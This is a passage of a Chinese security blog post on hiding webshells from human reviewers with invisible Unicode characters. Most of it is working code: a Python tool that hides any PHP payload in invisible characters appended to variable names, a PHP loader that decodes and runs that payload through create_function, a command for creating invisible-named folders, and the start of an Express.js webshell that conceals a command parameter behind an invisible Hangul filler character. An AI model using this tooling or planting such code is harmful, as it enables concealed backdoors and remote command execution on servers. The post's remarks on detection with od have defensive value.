class="hljs-variable">$verifyScore</span>()<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getArrayValue</span>(<span class="hljs-params"><span class="hljs-variable">$result</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([\t ]+)\r?\n?$/&#x27;</span>, <span class="hljs-variable">$result</span>, <span class="hljs-variable">$match</span>)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-variable">$lower</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\t&quot;</span>))<br>            <span class="hljs-variable">$higher</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>))<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$lower</span>.<span class="hljs-variable">$higher</span>)<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$result</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$score</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">getHigherScore</span>()<br><br></code></pre></td></tr></table></figure><br />
+然后隐藏：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054003718.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>光看嘛是看不出来什么东西的（注意，因为每一行的最后都会隐藏信息，所以如果原 php 代码的行数不够多，文件最后就会空出很多行，这样容易被发现，建议在加点垃圾代码填充一下，我比较懒就不搞了）<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054013334.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>但是搞个编辑器打开，就很容易被看出来：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054025281.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>有人可能会觉得这个文件很容易被发现，但实际上在真实的应急响应过程中，隐藏的手段往往就是这么简单，简单而有效。往往就是大家不屑一顾的小技巧，能达到出其不意的效果。</p>
+<p>当然这些道理我也是在后面磨炼中才悟到的。所以，在当时我对这个手段的态度，觉得它有趣要远大于觉得它很实用。</p>
+<h2 id="看不见的字符">看不见的字符</h2>
+<p>还是在前年吧，闲着无聊的时候翻阅 freebuf（日常无聊），看到了这么一篇文章：《Linux应急故事之四两拨千斤：黑客一个小小玩法，如何看瞎双眼》，https://www.freebuf.com/articles/terminal/187842.html ，就点进去看了一下。</p>
+<p>这篇文章说实话干货不多。。。我简单总结一下：入侵者将文件夹命名为 <code>. .</code>（中间是个空格），骗过了应急响应人员，使他找不到病毒文件夹。</p>
+<p>水归水，但这也证实了我上面的说法，简单有效是最好的。但我觉得这篇文章干货不多，原因并不是因为这个手段很 low 或者是他水平不行，而是攻击者居然用的是空格而不是其他更加隐蔽的字符。所以我带着失望的心情留下了这个评论：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054045332.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>图中利用了 Unicode 的一些不可见字符，不但搞出了多个 <code>..</code>，甚至还有多个 <code>.</code>，随便挑一个字符来用，不比用空格强？字符可用 <code>6D4</code>、<code>115F</code>、<code>1160</code>、<code>17B4</code>、<code>17B5</code>，我估计类似的还有很多很多，操作可以这样：<code>echo -e ".\u17B4." | xargs mkdir</code>。</p>
+<p>但是即使用了这些更加隐蔽的手段，也是能被找出来的，就比如文章中 dump 内存，或者用 od 也可以直接看的：<br />
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash-3.2$ ls -ad .*| od -c<br>0000000   .  \n   .   .  \n   .   � 236   �   .  \n<br>0000013<br></code></pre></td></tr></table></figure><br />
+再不济，就犹如那篇的文章评论区有人指出的：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054056142.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>类似的字符还有之前在 fb 上发出的一篇文章：《用零宽度字符水印揭露泄密者身份》，https://www.freebuf.com/articles/web/167903.html ，这篇文章里主要提到的是抓内鬼，防泄漏，当时我也写了个工具实现了一下：https://github.com/Macr0phag3/Zero-Width-Spaces-Hiden ，就是利用不可见的 Unicode 字符来隐藏信息。</p>
+<h2 id="过人-webshell-pro-版">过人 WebShell pro 版</h2>
+<p>那么我们现在有了什么呢？我们有了隐藏 webshell 的手段，又有了看不见的字符，如果将空格与 tab 分别用 2 个不同的不可见字符替换，过人 WebShell pro 版就诞生了：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> binascii<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_color</span>(<span class="hljs-params">string, color</span>):<br>    colors = &#123;<br>        <span class="hljs-string">&#x27;red&#x27;</span>: <span class="hljs-string">&#x27;31&#x27;</span>,<br>        <span class="hljs-string">&#x27;green&#x27;</span>: <span class="hljs-string">&#x27;32&#x27;</span>,<br>        <span class="hljs-string">&#x27;yellow&#x27;</span>: <span class="hljs-string">&#x27;33&#x27;</span>,<br><br>        <span class="hljs-string">&#x27;blue&#x27;</span>: <span class="hljs-string">&#x27;34&#x27;</span>,<br>        <span class="hljs-string">&#x27;pink&#x27;</span>: <span class="hljs-string">&#x27;35&#x27;</span>,<br>        <span class="hljs-string">&#x27;cyan&#x27;</span>: <span class="hljs-string">&#x27;36&#x27;</span>,<br>        <span class="hljs-string">&#x27;gray&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>        <span class="hljs-string">&#x27;white&#x27;</span>: <span class="hljs-string">&#x27;37&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\033[40;1;%s;40m%s\033[0m&#x27;</span> % (colors[color], <span class="hljs-built_in">str</span>(string))<br><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]:<br>    sys.exit(<br>        <span class="hljs-string">&#x27;&#x27;&#x27;[!] usage: python hidden_webshell.py payload filename [output_filename]\n&#x27;&#x27;&#x27;</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;  [-] example: python &#123;&#125;&#123;&#125;&#123;&#125;&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>            put_color(<span class="hljs-string">&#x27;hidden_webshell.py&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>),<br>            put_color(<span class="hljs-string">&#x27;&#x27;&#x27; &#x27;system(&quot;echo \\&quot;hacked by Tr0y :)\\&quot;&quot;);&#x27; &#x27;&#x27;&#x27;</span>, <span class="hljs-string">&#x27;green&#x27;</span>),<br>            put_color(<span class="hljs-string">&#x27;webshell.php&#x27;</span>, <span class="hljs-string">&#x27;blue&#x27;</span>)<br>        )<br>    )<br><br>webshell_name = sys.argv[<span class="hljs-number">2</span>]<br>hidden_name = sys.argv[<span class="hljs-number">3</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">4</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;webshell_hidden.php&#x27;</span><br>exp = sys.argv[<span class="hljs-number">1</span>]  <span class="hljs-comment"># &#x27;&#x27;&#x27;system(&quot;echo &#x27;hacked by Tr0y :)&#x27;&quot;);&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exp.endswith(<span class="hljs-string">&#x27;;&#x27;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] WARN: &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        put_color(<span class="hljs-string">&#x27;The payload should end in&#x27;</span>, <span class="hljs-string">&#x27;yellow&#x27;</span>),<br>        put_color(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;cyan&#x27;</span>)<br>    ))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Hide webshell&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-] Read from &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(put_color(webshell_name, <span class="hljs-string">&#x27;blue&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-] Payload is &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(put_color(exp, <span class="hljs-string">&#x27;green&#x27;</span>)))<br><br>hidden_str = [<span class="hljs-string">&quot;឴&quot;</span>, <span class="hljs-string">&quot;឵&quot;</span>]<br><span class="hljs-comment"># hidden_str = [&quot;K&quot;, &quot;k&quot;]</span><br>payload = <span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;create_function&#x27;</span> + exp)<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(webshell_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    raw_php = fp.readlines()<br><br>last_line_num = var_count = <span class="hljs-number">0</span><br>last_var = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> line_num, content <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(raw_php):<br>    php_var = re.findall(<span class="hljs-string">&#x27;^\s*(\$[0-9a-zA-Z\_]+)\s+=&#x27;</span>, content)<br>    <span class="hljs-keyword">if</span> php_var:<br>        last_var = php_var[<span class="hljs-number">0</span>]<br>        last_line_num = line_num<br>        var_count += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> var_count:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] ERRO: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        put_color(<span class="hljs-string">&#x27;The PHP file must contains valid $vars&#x27;</span>, <span class="hljs-string">&#x27;red&#x27;</span>),<br>    ))<br><br>replaced = &#123;&#125;<br><span class="hljs-keyword">for</span> line_num, content <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(raw_php[:last_line_num]):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> payload:<br>        <span class="hljs-keyword">break</span><br><br>    var_tmp = re.findall(<span class="hljs-string">&#x27;^\s*(\$[0-9a-zA-Z\_]+)\s+=&#x27;</span>, content)<br>    <span class="hljs-keyword">if</span> var_tmp:<br>        var = var_tmp[<span class="hljs-number">0</span>]<br>        content = raw_php[line_num]<br>        char = payload.pop(<span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># print(&#x27;隐藏&#x27;, char, content)</span><br>        hex_num = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(char))<br>        tab_num = <span class="hljs-built_in">int</span>(hex_num[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>        space_num = <span class="hljs-built_in">int</span>(hex_num[<span class="hljs-number">3</span>], <span class="hljs-number">16</span>)<br><br>        <span class="hljs-comment"># need_replace[var] = var + &quot;\u17B4&quot; * tab_num + &quot;\u17B5&quot; * space_num</span><br>        replace_str = var + hidden_str[<span class="hljs-number">0</span>] * tab_num + hidden_str[<span class="hljs-number">1</span>] * space_num<br>        replaced[var] = replace_str<br><br>    <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> replaced:<br>        tmp = re.findall(re.escape(var)+<span class="hljs-string">&#x27;(?![0-9a-zA-Z_])&#x27;</span>, raw_php[line_num])<br>        <span class="hljs-keyword">if</span> tmp:<br>            var_to_replace = tmp[<span class="hljs-number">0</span>]<br>            <span class="hljs-comment"># print(f&#x27;将 &#123;raw_php[line_num]&#125; 中的 &#123;var_to_replace&#125; 替换为 &#123;replaced[var]&#125;&#x27;)</span><br>            raw_php[line_num] = raw_php[line_num].replace(var_to_replace, replaced[var])<br><br><span class="hljs-keyword">if</span> payload:<br>    replace_str = <span class="hljs-built_in">bin</span>(<br>        <span class="hljs-built_in">int</span>(binascii.b2a_hex(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(payload), <span class="hljs-string">&#x27;utf8&#x27;</span>)), <span class="hljs-number">16</span>)<br>    )[<span class="hljs-number">2</span>:].replace(<span class="hljs-string">&#x27;0&#x27;</span>, hidden_str[<span class="hljs-number">0</span>]).replace(<span class="hljs-string">&#x27;1&#x27;</span>, hidden_str[<span class="hljs-number">1</span>])<br>    replaced[last_var] = last_var[:<span class="hljs-number">2</span>] + replace_str + last_var[<span class="hljs-number">2</span>:]<br><br>    <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> replaced:<br>        tmp = re.findall(re.escape(var)+<span class="hljs-string">&#x27;(?![0-9a-zA-Z_])&#x27;</span>, raw_php[last_line_num])<br>        <span class="hljs-keyword">if</span> tmp:<br>            var_to_replace = tmp[<span class="hljs-number">0</span>]<br>            <span class="hljs-comment"># print(f&#x27;将 &#123;raw_php[last_line_num]&#125; 中的 &#123;var_to_replace&#125; 替换为 &#123;replaced[var]&#125;&#x27;)</span><br>            raw_php[last_line_num] = raw_php[last_line_num].replace(var_to_replace, replaced[var])<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(hidden_name, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.writelines(raw_php)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Saved as &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(put_color(hidden_name, <span class="hljs-string">&#x27;blue&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] All done\n\nBye :)&#x27;</span>)<br><br></code></pre></td></tr></table></figure><br />
+同样，准备一下 php 文件：<br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL ^ E_WARNING);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$rawstr</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$index</span> = -<span class="hljs-number">4</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$rawstr</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rawstr</span>)+<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rawstr</span>)%<span class="hljs-number">4</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">abs</span>(<span class="hljs-variable">$index</span>) &lt;= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$result</span>, <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$index</span>, <span class="hljs-number">4</span>), <span class="hljs-number">2</span>, <span class="hljs-number">16</span>));<br>        <span class="hljs-variable">$index</span> -= <span class="hljs-number">4</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-variable">$result</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getHigherScore</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$lines</span> = <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-variable">$count</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$lower</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$higher</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$lines</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getArrayValue</span>(<span class="hljs-variable">$lines</span>[<span class="hljs-variable">$i</span>]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span>) <span class="hljs-variable">$count</span> += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> &lt; <span class="hljs-number">16</span>) <span class="hljs-variable">$lower</span> .= <span class="hljs-variable">$value</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable">$higher</span> .= <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$verifyScore</span> = <span class="hljs-variable">$lower</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$higher</span>&quot;</span>);<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$verifyScore</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getArrayValue</span>(<span class="hljs-params"><span class="hljs-variable">$test_str</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\s*\$[^឴឵]+([឴឵]+).?=/&#x27;</span>, <span class="hljs-variable">$test_str</span>, <span class="hljs-variable">$match_test_1</span>);<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\s*\$.([឴឵]+).*=/&#x27;</span>, <span class="hljs-variable">$test_str</span>, <span class="hljs-variable">$match_test_2</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$match_test_1</span>[<span class="hljs-number">0</span>])) &#123;<br>            <span class="hljs-variable">$lower_char</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$match_test_1</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;឴&quot;</span>));<br>            <span class="hljs-variable">$higher_char</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$match_test_1</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;឵&quot;</span>));<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$lower_char</span>.<span class="hljs-variable">$higher_char</span>));<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$match_test_2</span>[<span class="hljs-number">0</span>])) &#123;<br>            <span class="hljs-variable">$matched</span> = <span class="hljs-keyword">array</span>();<br>            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;឵&quot;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;឴&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-variable">$match_test_2</span>[<span class="hljs-number">1</span>]));<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>); <span class="hljs-variable">$i</span>++) &#123;<br>                <span class="hljs-variable">$matched</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$content</span>[<span class="hljs-variable">$i</span>] * <span class="hljs-number">1024</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$content</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$content</span>[<span class="hljs-number">1</span>]) &#123;<br>                    <span class="hljs-variable">$matched</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;H*&#x27;</span>, <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\d]+/i&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$matched</span>))));<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$score</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">getHigherScore</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></p>
+<p>运行！<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054139152.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>效果：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054139151.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>我试了很多方法，除非是用 od 这样挨个显示字符的，否则大多数编辑器/命令都不会显示这个两个字符：<code>\u17B4</code>、<code>\u17B5</code>。目前为止，唯一会显示出这两个字符的是 MacOS 自带的编辑器：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714054149232.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这两个之所以不可见，似乎是大部分编辑器对 Unicode 的支持不够好，很多字符显示不了。不管怎么说，去 Unicode 里再淘一淘其他字符，肯定会有更加合适的~</p>
+<p>注意：由于 php 会将这两个字符认为是普通字符而不是像空格、tab 这样的空白字符，放在行最后就会报错，所以隐藏方式我稍做了调整：将不可见字符插入到变量末尾，剩余的字符藏在最后一行，解析方式对应稍作改变。各位自行调整逻辑吧，放在注释里啊、固定的字符串里啊也都可以的，只要源代码看起来够正常即可。</p>
+<p>其实在大多数情况下，只需要在用终端的时候，大多数命令显示不出来这两个字符，就已经足够使用了。</p>
+<h2 id="过人-webshell-其他版">过人 WebShell 其他版</h2>
+<p>橘友们能看出下面这是一个 webshell 吗？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> exec = util.<span class="hljs-title function_">promisify</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/test&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> &#123; timeout,ㅤ &#125; = req.<span class="hljs-property">query</span>;<br>    <span class="hljs-keyword">const</span> checkCommands = [<br>        <span class="hljs-string">&#x27;echo &quot;hello&quot;&#x27;</span>,<br>        <span class="hljs-string">&#x27;echo &quot;this is a test 